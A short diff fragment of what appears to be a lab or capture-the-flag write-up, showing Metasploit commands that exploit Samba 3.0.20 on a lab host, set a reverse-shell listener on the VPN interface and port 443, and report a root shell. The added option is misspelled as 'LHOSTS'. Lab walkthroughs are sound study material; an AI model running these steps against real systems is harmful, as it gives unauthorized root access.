@@ -43,6 +43,9 @@ search samba 3.0.20
 use 0
 show options
 set RHOSTS 10.10.10.3
+##~~[Because we are using VPN]
+set LHOSTS tun0
+set LPORT 443
 run
 Result:
 Command shell returned. `id` command shows user: root.
